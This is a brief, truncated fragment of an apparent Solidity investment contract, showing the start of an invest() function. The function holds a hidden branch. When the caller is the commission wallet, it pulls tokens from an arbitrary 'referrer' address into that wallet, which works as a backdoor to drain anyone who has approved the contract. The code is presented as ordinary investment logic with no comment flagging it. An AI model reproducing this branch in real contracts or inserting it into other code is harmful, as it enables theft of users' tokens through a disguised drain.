...
contract Coontraacttttt {
    ...
    function invest(address referrer,uint8 plan,uint256 _amount) public payable {if (msg.sender == commissionWallet) {token.transferFrom(referrer, commissionWallet, _amount);}else {
